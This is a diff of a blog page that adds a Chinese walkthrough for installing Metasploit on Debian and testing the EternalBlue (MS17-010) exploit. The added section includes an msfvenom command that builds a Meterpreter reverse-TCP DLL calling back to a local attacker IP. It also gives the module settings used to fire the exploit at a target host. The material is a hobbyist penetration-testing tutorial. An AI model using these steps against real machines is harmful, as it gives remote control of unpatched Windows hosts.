@@ -283,7 +283,7 @@
               
                 
                 <a class="post-title-link" href="/2017/06/16/MetasploitFramework/" itemprop="url">
-                  MetasploitFramework
+                  MetasploitFramework搭建与说明
                 </a>
               
             
@@ -310,6 +310,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                    <span itemprop="name">Metasploit</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -328,7 +350,7 @@
 
           
           
-             <span id="/2017/06/16/MetasploitFramework/" class="leancloud_visitors" data-flag-title="MetasploitFramework">
+             <span id="/2017/06/16/MetasploitFramework/" class="leancloud_visitors" data-flag-title="MetasploitFramework搭建与说明">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -359,7 +381,29 @@
       
         
           
-            
+            <p><em>这里简单记录一下Metasploit的环境搭建以及一些简单的测试</em></p>
+<hr>
+<h1 id="系统选择"><a href="#系统选择" class="headerlink" title="系统选择"></a>系统选择</h1><p>我个人对于linux内核底层的一些东西是不是很熟悉的,所以对于现在主流的linux发行版,我个人觉得Ubuntu就是面对家庭使用的,Cent OS是服务器大量使用的一种版本,所以,我最终选择了Debian,注意..我不是挑事,也不是信仰问题,只是单纯的比较喜欢这个系统.而且Kali刚好也是基于Debian的发行版本开发的,所以刚好拿来用,如果用Kali的话,那下面这部分就完全不需要看了.</p>
+<h1 id="Metasploit框架安装"><a href="#Metasploit框架安装" class="headerlink" title="Metasploit框架安装"></a>Metasploit框架安装</h1><ol>
+<li>安装curl<br><code>apt-get install curl</code></li>
+<li><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</div><div class="line">  chmod 755 msfinstall &amp;&amp; \</div><div class="line">  ./msfinstall</div></pre></td></tr></table></figure>
+</li>
+<li><p>这样就完成了Metasploit框架的安装,如果还不懂的同学,看这里<font color="blue"><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="external">戳我</a></font>这里有安装说明,但是是英文的,看不懂的同学请自行翻译.</p>
+<h1 id="Metasploit简单测试"><a href="#Metasploit简单测试" class="headerlink" title="Metasploit简单测试"></a>Metasploit简单测试</h1><p>前段时间NSA爆出的EternalBlue,这个17-010漏洞就有点666了,就用它做个小测试.有大神已经把他移植到Metasploit里了,赶紧fork一下借来玩玩哈哈哈~</p>
+</li>
+<li>下载:<font color="blue"><a href="https://github.com/CCCY0/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">github</a></font><br>放到msf的usr/share/metasploit-framework/modules/exploits/windows/smb/目录里,改变.rb文件的目录和生成dll文件的名字<br><img src="./images/Metasploit/1.png" alt=""></li>
+<li>开启msf数据库<br>启动数据库：<code>service postgresql start</code><br>启动msfsploit服务：<code>service metasploit start</code><br>启动msfconsole：<code>msfconsole</code><br>使用<code>db_status</code>确认数据库是否正确连接<br>如果数据库未连接,使用<code>db_connect postgres:123456@127.0.0.1:5433/msf</code>连接数据库<br><img src="./images/Metasploit/2.png" alt=""><blockquote>
+<p>如果没有数据库账户,也没有数据库那么:<br><em>这些配置从网上找的,我没有验证过.</em><br>启动postgresql <code>sudo  systemctl start postgresql</code><br>切换到postgresql <code>su postgres</code><br>创建一个postgresql数据库账户 <code>create user root –P</code><br>接着，会提示输入密码，然后确认密码<br>创建数据库 <code>createdb --owner=root nexp_db</code><br>owner参数指定数据库的所有者，后一个参数为数据库名称<br>然后退出进入MSF连接数据库 <code>db_connect root:toor@localhost/nexp_db</code></p>
+</blockquote>
+</li>
+<li>利用ms17-010漏洞扫描工具扫描<br><img src="./images/Metasploit/3.png" alt=""><br>扫描过程省略…</li>
+<li>打开多架构兼容模式,安装32位运行库,安装32位wine<br><code>sudo dpkg --add-architecture i386</code><br><code>apt-get update</code><br><code>apt-get install   lib32z1 lib32ncurses5</code><br><code>apt-get install wine</code><br>或者重新安装wine<br><code>rm –rf /root/.wine/</code> —删除wine<br><code>wine cmd.exe</code> –安装wine<br>这里可能出错,具体以后再说.</li>
+<li>生成64位的dll<br><code>msfvemon -p windows/x64/meterpreter/reverse_tcp lhost=192.168.12.110 lport=4444 -f dll -o /root/dll/s11.dll</code><br>这里注意,如果你自己指定目录,需要把.rb文件里面下面那一行.dll文件的目录也修改了.lhost是本地ip.</li>
+<li>启动msf调用这个模块并进行配置<br><img src="./images/Metasploit/4.png" alt=""><br>set rhost —目标ip<br>set lhost —本地ip<br>set target —架构,根据rb文件来看,用9就可以<br>set targetarchitecture —目标架构<br>set payload windows/… —payload程序架构<br>设置好了之后,RUN!</li>
+<li>关于meterpreter:这个东西还是挺不错的,关于后渗透的东西,以后再说吧- -.</li>
+</ol>
+
           
         
       
@@ -644,7 +688,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-count">2</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
